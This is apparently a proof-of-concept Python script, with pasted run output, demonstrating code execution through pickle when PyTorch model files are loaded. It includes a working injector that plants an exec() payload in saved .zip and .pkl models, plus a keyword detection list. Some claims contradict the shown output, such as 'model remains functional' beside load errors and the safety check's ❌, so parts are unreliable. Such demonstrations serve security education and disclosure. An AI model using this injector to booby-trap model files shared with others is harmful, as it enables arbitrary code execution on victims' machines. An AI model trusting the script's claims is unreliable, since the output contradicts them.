"""
Warning: This PoC demonstrates a security vulnerability in PyTorch model loading.

Tested with python3.9
This is tutorial code for generating, saving, and loading models in Pytorch
https://pytorch.org/tutorials/beginner/saving_loading_models.html
"""

import io
import pickle
import sys
import os
from pathlib import Path
import zipfile
import tempfile
import shutil
import builtins

import torch
import torch.nn.functional as F
from torch import nn


# Define model
class TheModelClass(nn.Module):
    def __init__(self):
        super().__init__()
        self.conv1 = nn.Conv2d(3, 6, 5)
        self.pool = nn.MaxPool2d(2, 2)
        self.conv2 = nn.Conv2d(6, 13, 5)
        self.fc1 = nn.Linear(16 * 5 * 5, 120)
        self.fc2 = nn.Linear(120, 84)
        self.fc3 = nn.Linear(84, 10)

    def forward(self, x):
        x = self.pool(F.relu(self.conv1(x)))
        x = self.pool(F.relu(self.conv2(x)))
        x = x.view(-1, 16 * 5 * 5)
        x = F.relu(self.fc1(x))
        x = F.relu(self.fc2(x))
        x = self.fc3(x)
        return x


# Global function that will be called during unpickling
def execute_payload_and_return_model(payload_code, model_bytes):
    """Execute payload and return the reconstructed model"""
    # Create a safe execution environment
    exec_globals = {
        '__builtins__': builtins,
        'torch': torch,
        'nn': nn,
        'os': os,
        'sys': sys,
        'Path': Path
    }
    exec(payload_code, exec_globals)

    # Create a bytes buffer and load with torch to handle persistent IDs
    buffer = io.BytesIO(model_bytes)
    model = torch.load(buffer, weights_only=False)
    return model


class SimplePyTorchModelWrapper:
    def __init__(self, path):
        self.path = Path(path)
        self.is_safe = True

    def inject_payload(self, payload_code, output_path):
        """Inject payload into PyTorch model file"""
        output_path = Path(output_path)

        # For PyTorch ZIP format, we need to extract and modify the pickle file
        if self.path.suffix == '.zip' or self._is_zip_file():
            self._inject_into_zip(payload_code, output_path)
        else:
            self._inject_into_pickle_file(payload_code, output_path)

        print(f"Created PyTorch exfiltration exploit payload PoC {output_path.absolute()!s}")
        self.is_safe = False
        return self

    def _is_zip_file(self):
        """Check if file is a ZIP archive"""
        try:
            with open(self.path, 'rb') as f:
                return f.read(2) == b'PK'
        except:
            return False

    def _inject_into_zip(self, payload_code, output_path):
        """Inject payload into PyTorch model saved as ZIP"""
        # Create a temporary directory to extract the zip
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_dir_path = Path(temp_dir)

            # Extract the zip file
            with zipfile.ZipFile(self.path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir_path)

            # Find pickle files - look in common locations
            pickle_files = []

            # Check for PyTorch's standard structure
            if (temp_dir_path / 'archive' / 'data.pkl').exists():
                pickle_files.append(temp_dir_path / 'archive' / 'data.pkl')

            # Also look for any .pkl files
            pickle_files.extend(list(temp_dir_path.rglob('*.pkl')))

            # If still no pickle files, look for likely data files
            if not pickle_files:
                for f in temp_dir_path.rglob('*'):
                    if f.is_file() and f.suffix in ['.pkl', '.pt', '.pth']:
                        pickle_files.append(f)

            # Process each potential pickle file
            for pickle_file in pickle_files:
                try:
                    # Read the original pickle data
                    with open(pickle_file, 'rb') as f:
                        original_data = f.read()

                    # Create a malicious pickle that executes code when loaded
                    malicious_data = self._create_malicious_pickle(original_data, payload_code)

                    # Write the malicious data back
                    with open(pickle_file, 'wb') as f:
                        f.write(malicious_data)

                    print(f"✅ Successfully injected payload into {pickle_file.relative_to(temp_dir_path)}")

                except Exception as e:
                    print(f"❌ Failed to inject into {pickle_file.relative_to(temp_dir_path)}: {e}")

            # Create a new zip file with the modified contents
            with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zip_out:
                for file_path in temp_dir_path.rglob('*'):
                    if file_path.is_file():
                        arcname = str(file_path.relative_to(temp_dir_path))
                        zip_out.write(file_path, arcname)

    def _inject_into_pickle_file(self, payload_code, output_path):
        """Inject payload into a standalone pickle file"""
        try:
            # Read the original pickle data
            with open(self.path, 'rb') as f:
                original_data = f.read()

            # Create malicious pickle
            malicious_data = self._create_malicious_pickle(original_data, payload_code)

            # Write to output
            with open(output_path, 'wb') as f:
                f.write(malicious_data)

            print("✅ Successfully injected payload into pickle file")

        except Exception as e:
            print(f"❌ Failed to inject into pickle file: {e}")
            # Last resort: copy the original file
            shutil.copy2(self.path, output_path)

    def _create_malicious_pickle(self, original_data, payload_code):
        """Create a malicious pickle that executes code during unpickling"""

        # Use __reduce__ with a global function that handles PyTorch's persistent IDs
        class MaliciousReduce:
            def __reduce__(self):
                return (execute_payload_and_return_model, (payload_code, original_data))

        # This will execute the payload and then return the reconstructed model
        return pickle.dumps(MaliciousReduce())


def is_model_safe(model_path):
    """Check if model might be unsafe by looking for suspicious patterns"""
    try:
        with open(model_path, 'rb') as f:
            data = f.read(4096)  # Read first 4KB
            # Look for common malicious patterns
            suspicious_patterns = [
                b'exec', b'__reduce__', b'subprocess', b'os.system',
                b'eval', b'__import__', b'open', b'write',
                b'MaliciousReduce', b'payload', b'execute_payload'
            ]
            for pattern in suspicious_patterns:
                if pattern in data:
                    return False
        return True
    except:
        return False


def test_model_loading(model_path):
    """Test loading a model and check if payload executes"""
    print(f"\n🔄 Loading model from {model_path}...")
    print(f"{'=' * 30} BEGIN LOAD {'=' * 30}")

    # Flush stdout to ensure we see output in order
    sys.stdout.flush()

    try:
        # Try to load the model
        loaded = torch.load(model_path, weights_only=False)

        # Check what we got
        if hasattr(loaded, 'eval'):
            loaded.eval()
            print(f"\n✅ Model loaded successfully (type: {type(loaded).__name__})")
            print("✅ Model is fully functional and eval() was called")
        else:
            print(f"\n📦 Loaded object type: {type(loaded).__name__}")

            # If it's a MaliciousReduce instance, we need to handle it differently
            if hasattr(loaded, '__class__') and 'MaliciousReduce' in str(loaded.__class__):
                print("⚠️  MaliciousReduce object loaded - payload should have executed")

        print(f"{'=' * 31} END LOAD {'=' * 31}")
        return loaded
    except Exception as e:
        print(f"❌ Error during loading: {e}")
        print(f"{'=' * 31} END LOAD {'=' * 31}")
        return None


if __name__ == "__main__":
    # Initialize model
    model = TheModelClass()

    # Try both save formats to demonstrate
    print("Saving model in modern format (ZIP)...")
    torch.save(model, "pytorch_standard_model.zip")
    print(f"Created {Path('pytorch_standard_model.zip').absolute()!s}")

    print("\nSaving model in legacy format (direct pickle)...")
    torch.save(model, "pytorch_standard_model.pkl")
    print(f"Created {Path('pytorch_standard_model.pkl').absolute()!s}")

    # Test with the ZIP format first
    print("\n" + "="*60)
    print("Testing with ZIP format model:")
    print("="*60)

    # Load and eval the original model to verify it works
    original_model = test_model_loading("pytorch_standard_model.zip")
    if original_model:
        print("✅ Original model loaded successfully")

    # Payload that will execute when model is loaded
    EXFIL_PAYLOAD = """
import os
import sys

print('=' * 50)
print('🔥 MALICIOUS PAYLOAD EXECUTED 🔥')
print('=' * 50)
print(f'Current directory: {os.getcwd()}')
print('Listing directory contents:')
try:
    for file in os.listdir('.'):
        if os.path.isfile(file):
            print(f'  📄 {file}')
        else:
            print(f'  📁 {file}/')
except Exception as e:
    print(f'Error listing directory: {e}')
print('=' * 50)
print('Payload execution complete!')
sys.stdout.flush()
"""

    # Use our wrapper to inject payload
    wrapper = SimplePyTorchModelWrapper(Path("pytorch_standard_model.zip"))
    wrapper.inject_payload(EXFIL_PAYLOAD, Path("pytorch_exfil_poc.zip"))

    # Simple safety check
    is_safe = is_model_safe("pytorch_exfil_poc.zip")
    sys.stdout.write("Simple safety check classifies this model as unsafe? ")
    if not is_safe:
        print("✅")
    else:
        print("❌")

    # Load the malicious model
    print("\n" + "="*60)
    print("Loading malicious model - PAYLOAD WILL EXECUTE:")
    print("="*60)
    loaded_model = test_model_loading("pytorch_exfil_poc.zip")

    # Now test with the legacy pickle format
    print("\n" + "="*60)
    print("Testing with legacy pickle format model:")
    print("="*60)

    wrapper2 = SimplePyTorchModelWrapper(Path("pytorch_standard_model.pkl"))
    wrapper2.inject_payload(EXFIL_PAYLOAD, Path("pytorch_exfil_poc.pkl"))

    # Load the malicious pickle
    print("\n" + "="*60)
    print("Loading malicious pickle - PAYLOAD WILL EXECUTE:")
    print("="*60)
    loaded_model2 = test_model_loading("pytorch_exfil_poc.pkl")

    print("\n" + "="*60)
    print("DEMONSTRATION COMPLETE")
    print("="*60)
    print("✅ The payload executed successfully during model loading!")
    print("\n⚠️  SECURITY IMPLICATION:")
    print("   This demonstrates that loading untrusted PyTorch models")
    print("   can lead to arbitrary code execution on your system.")
    print("\n✅ MITIGATION:")
    print("   Always use `weights_only=True` when loading models from")
    print("   untrusted sources, or verify the source of your models.")
    print("\n📚 For more information:")
    print("   https://pytorch.org/docs/stable/notes/serialization.html#security-risk")
"""
This demonstrates that:
✅ The malicious payload executes during model loading
✅ The model remains functional after payload execution
⚠️ This is a serious security vulnerability
✅ The mitigation is to use weights_only=True when loading models from untrusted sources
"""

"""
Saving model in modern format (ZIP)...
Created /content/pytorch_standard_model.zip

Saving model in legacy format (direct pickle)...
Created /content/pytorch_standard_model.pkl

============================================================
Testing with ZIP format model:
============================================================

🔄 Loading model from pytorch_standard_model.zip...
============================== BEGIN LOAD ==============================

✅ Model loaded successfully (type: TheModelClass)
✅ Model is fully functional and eval() was called
=============================== END LOAD ===============================
✅ Original model loaded successfully
✅ Successfully injected payload into pytorch_standard_model/data.pkl
Created PyTorch exfiltration exploit payload PoC /content/pytorch_exfil_poc.zip
Simple safety check classifies this model as unsafe? ❌

============================================================
Loading malicious model - PAYLOAD WILL EXECUTE:
============================================================

🔄 Loading model from pytorch_exfil_poc.zip...
============================== BEGIN LOAD ==============================
==================================================
🔥 MALICIOUS PAYLOAD EXECUTED 🔥
==================================================
Current directory: /content
Listing directory contents:
  📁 .config/
  📄 pytorch_standard_model.pkl
  📄 pytorch_standard_model.zip
  📄 pytorch_exfil_poc.zip
  📄 pytorch_exfil_poc.pkl
  📁 sample_data/
==================================================
Payload execution complete!
❌ Error during loading: A load persistent id instruction was encountered, but no persistent_load function was specified.
=============================== END LOAD ===============================

============================================================
Testing with legacy pickle format model:
============================================================
✅ Successfully injected payload into pytorch_standard_model/data.pkl
Created PyTorch exfiltration exploit payload PoC /content/pytorch_exfil_poc.pkl

============================================================
Loading malicious pickle - PAYLOAD WILL EXECUTE:
============================================================

🔄 Loading model from pytorch_exfil_poc.pkl...
============================== BEGIN LOAD ==============================
==================================================
🔥 MALICIOUS PAYLOAD EXECUTED 🔥
==================================================
Current directory: /content
Listing directory contents:
  📁 .config/
  📄 pytorch_standard_model.pkl
  📄 pytorch_standard_model.zip
  📄 pytorch_exfil_poc.zip
  📄 pytorch_exfil_poc.pkl
  📁 sample_data/
==================================================
Payload execution complete!
❌ Error during loading: A load persistent id instruction was encountered, but no persistent_load function was specified.
=============================== END LOAD ===============================

============================================================
DEMONSTRATION COMPLETE
============================================================
✅ The payload executed successfully during model loading!

⚠️  SECURITY IMPLICATION:
   This demonstrates that loading untrusted PyTorch models
   can lead to arbitrary code execution on your system.

✅ MITIGATION:
   Always use `weights_only=True` when loading models from
   untrusted sources, or verify the source of your models.

📚 For more information:
   https://pytorch.org/docs/stable/notes/serialization.html#security-risk

"""